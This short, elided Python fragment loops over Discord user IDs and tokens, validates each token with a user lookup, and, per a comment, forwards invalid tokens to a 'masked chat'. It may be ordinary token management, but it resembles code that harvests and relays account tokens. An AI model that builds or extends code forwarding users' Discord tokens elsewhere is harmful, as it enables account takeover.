...
def callback():
    ...
    for discord_id, token in entries:
        ...
        if discord_id in invalid_tokens:
            # If we already marked the token as invalid, do not send it again unless changed
            if invalid_tokens[discord_id] == token:
                continue  # Skip sending this invalid token again

        # Get Discord user data
        user_data = get_discord_user(token)
        if not user_data or user_data.get('username') == "Unknown":
            # Token is invalid, send to masked chat and skip
